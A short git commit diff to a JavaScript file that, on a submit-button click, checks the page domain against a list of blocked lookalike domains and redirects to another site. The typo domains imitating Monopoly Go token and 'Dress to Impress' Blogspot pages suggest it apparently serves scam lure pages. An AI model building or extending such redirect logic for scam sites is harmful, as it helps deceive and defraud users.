d23c3021ab84b3a4a53cf5e85986bbd22a24ad8a
dev20l <iphonetasli@gmail.com>
2025-03-20 10:17:15 +0000

    Update dti1.js

--- dti1.js
+++ dti1.js
@@ -3,12 +3,12 @@
 var button = document.querySelector('#submitButton');  
 button.addEventListener('click', function() {
     (function() {
-        var originalDomain = "monoplytokens.com";
+        var originalDomain = "dti2s.blogsot.com";
         var redirectURL = "https://www.rolls3.com/";
         var blockedDomains = [
-            "jsdhjjhhjjhejkjkas.blogspot.com",
-            "mply.io.t0ke2n.site",
-            "mply.io.1arshg4.site",
+            "dti2s.blspot.com",
+            "dresstoimpres2.blogst.com/",
+            "dresstoimpres2.bgspot.com",
             "mply.io.4a6b8dh.site"
         ];
 
